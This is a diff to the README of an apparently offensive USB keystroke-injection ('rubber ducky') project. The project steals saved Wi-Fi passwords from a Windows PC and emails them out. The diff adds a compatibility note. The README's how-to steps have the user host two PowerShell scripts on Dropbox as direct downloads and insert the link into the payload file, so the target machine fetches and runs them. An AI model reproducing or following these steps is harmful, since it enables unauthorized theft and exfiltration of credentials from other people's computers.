@@ -1,6 +1,7 @@
 # rubberduck-steal-wifi-passwords-and-send-via-email
 simple script that steals your saved passwords from a PC and sends them via email.
-
+# Version
+Works on Windows 11 (should work on Windows 10, if not its probly bc of temp folder).
 # How to use
 1. Create a Dropbox account and upload both "downwifi.ps1" and "emailsender.ps1". Copy the links and change the last letters (dl=0) to dl=1.
 2. Replace example.com with your Dropbox link (in payload.dd).
